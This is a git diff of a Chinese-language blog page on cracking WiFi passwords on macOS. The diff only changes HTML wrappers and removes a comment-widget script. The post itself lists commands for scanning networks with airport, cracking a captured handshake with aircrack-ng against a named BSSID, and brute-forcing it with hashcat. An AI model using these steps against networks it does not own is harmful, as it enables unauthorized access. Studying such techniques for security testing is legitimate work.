@@ -117,15 +117,14 @@
 
         <span itemprop="articleBody"><h3 id="0x00-必读link">0x00 必读link</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>https://gist.github.com/victorreyesh/6532800
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://gist.github.com/victorreyesh/6532800
 https://www.aircrack-ng.org/install.html
 https://apple.stackexchange.com/questions/117843/equivalent-of-airodump-ng-for-max-os-x
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x01-airport">0x01 airport</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>find / -name "airport"
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -name "airport"
 airport -s
     root in ~ λ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
                                 SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
@@ -142,12 +141,11 @@ aircrack-ng -w ......./pass.txt -b 50:bd:5f:6e:3f:44 /tmp/*.cap
     或者将cap文件转成hashcat支持的格式再用hashcat破解:
     a.将https://github.com/hashcat/hashcat-utils/releases里面的cap2hccapx.bin放到kali64(vm)下运行得到hccapx文件,然后再运行:
     b.hashcat -a 3 -m 2500 output.hccapx ?d?d?d?d?d?d?d?d
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x02-attention">0x02 Attention</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>1.aircrack-ng官网说airodump-ng和aireplay-ng在macOS不支持
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.aircrack-ng官网说airodump-ng和aireplay-ng在macOS不支持
     airodump-ng可以看到已经建立的wifi连接
     aireplay-ng可以主动攻击wifi,上面的airport en1 sniff 只能被动等待有人连接wifi
     ---detail...
@@ -160,15 +158,13 @@ aircrack-ng -w ......./pass.txt -b 50:bd:5f:6e:3f:44 /tmp/*.cap
 
 2.KisMac2不支持macOS sierra,目前新版本的macOS只能用上面的airport的被动方法crack wifi,除非找到了airodump-ng和
 aireplay-ng的替代品
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x03-xwifi">0x03 xwifi</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>以上自动化脚本成xwifi如下
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>以上自动化脚本成xwifi如下
 https://github.com/3xp10it/xwifi/
-</code></pre>
-</div>
+</code></pre></div></div>
 </span>
 
         
@@ -206,16 +202,6 @@ https://github.com/3xp10it/xwifi/
 
 
 
-      
-<!--PC和WAP自适应版-->
-<div id="SOHUCS" style="width:980px"></div> 
-<script type="text/javascript"> 
-(function(){ 
-var appid = 'cyt1tnTcP'; 
-var conf = 'prod_a926ede5ea067744d582783ccd509c1f'; 
-var width = window.innerWidth || document.documentElement.clientWidth; 
-if (width < 960) { 
-window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("http://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
       
 
 
